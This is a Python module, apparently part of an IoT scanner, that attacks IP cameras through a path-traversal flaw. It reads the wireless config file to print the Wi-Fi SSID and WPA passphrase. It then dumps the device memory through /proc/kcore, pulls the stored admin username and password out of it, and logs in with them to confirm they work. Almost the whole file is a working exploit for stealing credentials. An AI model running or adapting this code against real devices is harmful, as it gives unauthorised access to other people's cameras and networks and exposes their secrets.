import requests
import json
import re
from urllib.request import urlopen
from urllib.error import HTTPError, URLError
from requests.exceptions import ConnectionError
from core.const import logger, WEAK_LEVEL

mac_pattern = re.compile("(?<=id\=\').*?(?=\')")
string_pattern = re.compile(b'[^\x00-\x1F\x7F-\xFF]{4,}')


# ip filter basically testing if can be "pinged"
def _verify(dev):
    ip = dev["ip_addr"]
    logger.info(u"获取地址为%s的主机的信息。。。" % ip)

    try:
        resp = urlopen("http://%s/get_status.cgi" % ip).read().decode("utf-8")
    except (HTTPError, URLError):
        logger.info("无法获取设备信息，扫描下一个。。。\n")
        return False
    else:
        dev["mac_addr"] = mac_pattern.search(resp).group()
        logger.warning("目标主机的mac地址为: %s " % dev["mac_addr"])

    try:
        resp = urlopen("http://%s//etc/RT2870STA.dat" % ip, timeout=10).read().decode("utf-8")
    except (HTTPError, URLError):
        logger.info("目标设备未开启无线网络")
    else:
        wireless_info = resp.split("\n")
        wireless_info.remove("")  # to beautify the output by reomve all blank lines
        logger.warning("目标设备无线网络信息如下：")
        for line in wireless_info:
            if line.startswith("WPAPSK") or line.startswith("SSID"):
                logger.warning(line)
                # else:
                #     logger.critical(line)

    try:
        urlopen("http://%s//proc/kcore" % ip)
    except (HTTPError, URLError) as err:
        logger.info("目标设备不存在内存泄露漏洞，扫描下一个。。。\n")
        return False
    else:
        logger.warning("%s设备存在内存泄露漏洞！\n" % ip)
        dev["level"] = WEAK_LEVEL.VULNERABLE
        logger.critical(json.dumps(dev))
        print(json.dumps(dev))
        return True


# try to get the username and password and login
def _attack(dev):
    r = requests.get("http://%s//proc/kcore" % dev["ip_addr"], stream=True, timeout=30)
    mac_addr = dev["mac_addr"].encode()
    logger.info("开始检查主机是否有用户名密码泄露")
    count = 0
    r = r.iter_lines()
    while True:
        count += 1
        try:
            line = next(r)
            if mac_addr in line:
                print("在第%s行找到设备信息" % count)
                # monitor the function of strings
                candi = string_pattern.findall(line)
                print("本行信息：%s" % candi)
                idx = candi.index(mac_addr)
                user = candi[idx + 2].decode("ascii")
                passwd = candi[idx + 3].decode("ascii")
                logger.warning("可能的用户名:%s, 密码:%s" % (user, passwd))
                print("验证之前")
                # fixme: is it possible not to close?maybe other info after it?
                r.close()
                if requests.get("http://%s/get_params.cgi?user=%s&pwd=%s" % (
                dev["ip_addr"], user, passwd)).status_code == 200:
                    dev["user"] = user
                    dev["passwd"] = passwd
                    dev["level"] = WEAK_LEVEL.FRAGILE
                    logger.error("用户名密码验证成功\n")
                else:
                    logger.info("用户名密码验证失败\n")
                logger.critical(dev)
                return True
        # some may be b'ipcamera_006E0606CA89'
        except ValueError:
            continue
        except (ConnectionError, StopIteration):
            logger.info("在内存文件中未找到用户名密码，共检查%s行" % count)
            return True

